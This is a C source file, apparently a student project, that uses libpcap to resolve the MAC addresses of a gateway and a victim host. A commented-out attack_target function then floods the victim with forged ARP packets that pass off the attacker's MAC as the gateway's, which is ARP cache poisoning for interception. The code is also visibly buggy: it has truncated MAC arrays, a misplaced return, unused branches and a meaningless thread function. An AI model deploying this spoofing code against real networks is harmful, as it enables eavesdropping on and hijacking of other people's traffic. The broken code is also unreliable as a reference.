#include <pcap.h>
#include<stdint.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <pthread.h>
int send_arp(pcap_t *h,const u_char *arp_packet, u_char *sum1);
void reply_arp(const u_char *packet);
static void *readingpacket(pcap_t *h);
void gateway_sendpacket(pcap_t h);
void host_sendpacket(pcap_t h);
u_char *recvpacket(const u_char *packet);
//void attack_target(pcap_t *handle);
struct ethernet_hdr
{
    uint8_t  ether_dhost[6];/* destination ethernet address */
    uint8_t  ether_shost[6];/* source ethernet address */
    uint16_t ether_type;                 /* protocol */
};

struct arp_hdr
{
    uint16_t ar_hrd;         /* format of hardware address */
    uint16_t ar_pro;         /* format of protocol address */
    uint8_t  ar_hln;         /* length of hardware address */
    uint8_t  ar_pln;         /* length of protocol addres */
    uint16_t ar_op;          /* operation type */
    u_char  ar_sendermac[6];
    u_char  ar_sendip[4];
    u_char  ar_targetmac[6];
    u_char  ar_targetip[4];

};

struct sum //packging packet
{
    ethernet_hdr a;
    arp_hdr b;
};

int arp_setting(ethernet_hdr &a, arp_hdr &b,int flag);

//my ethernet importmation
uint8_t myethernet[6] = {0x0c,0x29,0xd6,0x34,0x32}; //ethernetmac address
uint8_t broadcastmac[6] = {0xff,0xff,0xff,0xff,0xff};
char my_ip[] = "192.168.25.4";
u_char *gatewaymac, *hostmac;
in_addr myip, recvip , targetip; // recvip = gateway, targetip = victeam

//thread
pthread_t tid;


void *thread(void *unused);
int stop =1;
int main(int args,char *argv[])

{
    struct pcap_pkthdr pcap_header; //pcap next
    ethernet_hdr main_ethernet;
    arp_hdr main_arp;
    sum *s,*s1;
    pcap_t *handle;            /* Session handle */
    const u_char *packet;
    char *dev;            /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];    /* Error string */
    dev  =  "eth0";
    if (dev == NULL) {
        fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
        return(2);
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return(2);
    }

    //recv mac address getting!!
    inet_aton(my_ip,&myip);
    inet_aton(argv[2],&recvip);
            if(arp_setting(main_ethernet,main_arp,1) == 0)
            printf("setting success!!\n");

    s = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
    s->a = main_ethernet; //ethernet
    s->b = main_arp; //arp
    const u_char *c = (u_char *)s;
    printf("gatewaypacket\nsource ip : %s\n",inet_ntoa(myip));
    printf("destinaion ip ; %s\n",inet_ntoa(recvip));
    if(pcap_sendpacket(handle,c,sizeof(*s)) == 0) //block : host_pc is not reply
    {
        printf("first packetsend!!\n ");
        packet = pcap_next(handle,&pcap_header);
        gatewaymac =recvpacket(packet);
    //    reply_arp(packet);

    }
    printf("configuration!!!!!!!!!!!\n");
    printf("gateway!!!! : %s\n",ether_ntoa((ether_addr *)(gatewaymac)));

    //target mac address gettting!!
    ethernet_hdr main2_ethernet;
    arp_hdr main2_arp;
    inet_aton(argv[1],&targetip);
    printf("target_host ip : %s\n",inet_ntoa(targetip));
    if(arp_setting(main2_ethernet,main2_arp,1) == 0)
    printf("setting success!!\n");


    s1 = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
    s1->a = main2_ethernet; //ethernet
    s1->b = main2_arp; //arp
    const u_char *c1 = (u_char *)s1;
    if(pcap_sendpacket(handle,c,sizeof(*s)) == 0 && pcap_sendpacket(handle,c1,sizeof(*s1)) == 0)
    {

       printf("second packetsend!!\n");
       packet = pcap_next(handle,&pcap_header);
       hostmac = recvpacket(packet);
    }
printf("target!!!! : %s\n",ether_ntoa((ether_addr *)(hostmac)));
//  Attack ARP target !!




    //  attack_target(handle);



    /* And close the session */

    pcap_close(handle);

    return(0);


}
int arp_setting(ethernet_hdr &e, arp_hdr &a,int flag)
{
    //ethernet_broadcast impormation
    memcpy(e.ether_shost,&myethernet,6);
    memset(e.ether_dhost,0xff,6);
    e.ether_type = htons(ETHERTYPE_ARP); //claer
    a.ar_hln = 6;//hawdware szie
    a.ar_pln = 4;//protocol size
    a.ar_hrd = htons(ARPHRD_ETHER);
    a.ar_pro = htons(ETHERTYPE_IP);
    a.ar_op = htons(ARPOP_REQUEST);
    //ARP MAC
    memcpy(a.ar_sendermac,&myethernet,6);
    memset(a.ar_targetmac,0,sizeof(a.ar_targetmac));
    //ARP IP

    switch(flag)
    {
case 1:
        memcpy(a.ar_sendip, &myip, 4);
        memcpy(a.ar_targetip, &recvip,4);
        break;
case 2:

        memcpy(a.ar_sendip, &myip, 4);
        memcpy(a.ar_targetip, &targetip,4);
        break;

        return 0;
}
}

u_char *recvpacket(const u_char *packet)
{
    ethernet_hdr *ethernet = (ethernet_hdr *) packet;
    u_char t_ip[4],g_ip[4];
    memcpy(g_ip, &recvip, 4);
    memcpy(t_ip, &targetip,4);
    if(ntohs(ethernet->ether_type) == ETHERTYPE_ARP)
{
    arp_hdr *arp_packet = (arp_hdr *)(packet + sizeof(ethernet_hdr));
    if((ntohs(arp_packet->ar_pro) == ETHERTYPE_IP )&&(ntohs(arp_packet->ar_op) == ARPOP_REPLY))
 {
    if(memcmp(arp_packet->ar_sendip,&g_ip,4)==0)
    {
        printf("gateway mac : %s\n",ether_ntoa((ether_addr *)(arp_packet->ar_sendermac)));
        return(arp_packet->ar_sendermac);
    }
    else if(memcmp(arp_packet->ar_sendip,&t_ip,4)==0)

    {
        printf("target mac : %s\n",ether_ntoa((ether_addr *)(arp_packet->ar_sendermac)));
        return(arp_packet->ar_sendermac);
    }
 }
}
}
/*
void attack_target(pcap_t *handle)
{
    sum *s3;
    ethernet_hdr attack_ether;
    arp_hdr attack_arp;
    memcpy(attack_ether.ether_shost,&myethernet,6);
    memcpy(attack_ether.ether_dhost,&hostmac,6);
    attack_ether.ether_type = htons(ETHERTYPE_ARP); //claer
    attack_arp.ar_hln = 6;//hawdware szie
    attack_arp.ar_pln = 4;//protocol size
    attack_arp.ar_hrd = htons(ARPHRD_ETHER);
    attack_arp.ar_pro = htons(ETHERTYPE_IP);
    attack_arp.ar_op = htons(ARPOP_REQUEST);
    memcpy(attack_arp.ar_sendermac,&myethernet,6);
    memcpy(attack_arp.ar_sendip,&recvip,4);
    memcpy(attack_arp.ar_targetip,&targetip,4);
    memcpy(attack_arp.ar_targetmac,&hostmac,6);
    printf("ATTACK HEADER INFORMAION!!!!\n");
    printf("ethernet s_mac : %s\n",ether_ntoa((ether_addr *)(attack_ether.ether_shost)));
    printf("ethernet d_mac : %s\n",ether_ntoa((ether_addr *)(attack_ether.ether_dhost)));
    printf("sender mac : %s\n",ether_ntoa((ether_addr *)(attack_arp.ar_sendermac)));
    printf("target mac : %s\n",ether_ntoa((ether_addr *)(attack_arp.ar_targetmac)));
    s3 = (sum*)malloc(sizeof(ethernet_hdr) + sizeof(arp_hdr));
    s3->a = attack_ether; //ethernet
    s3->b = attack_arp; //arp
    const u_char *c3= (u_char *)s3;
    printf("attack!!\n");
    printf("sending!!");
    while(stop)
    {
    pcap_sendpacket(handle,c3,sizeof(*s3));
    }


}
*/
void *thread(void *unused)
{

    void gateway_sendpacket();
    void host_sendpacket();
}





